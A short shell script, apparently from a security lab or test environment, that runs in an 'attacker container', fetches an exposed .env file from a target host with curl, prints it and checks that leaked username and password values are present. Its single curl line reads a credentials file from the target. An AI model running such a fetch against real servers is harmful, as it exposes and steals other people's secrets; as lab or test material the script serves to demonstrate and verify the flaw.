#!/bin/sh
# Runs in the attacker container; fetches the exposed .env over the tap.
set -eu
body=$(curl -fsS "http://$BOX_HOST/.env")
echo "$body"
echo "$body" | grep -q "${BOX_LEAK_USER}" || { echo "leaked user missing" >&2; exit 1; }
echo "$body" | grep -q "${BOX_LEAK_PASS}" || { echo "leaked password missing" >&2; exit 1; }
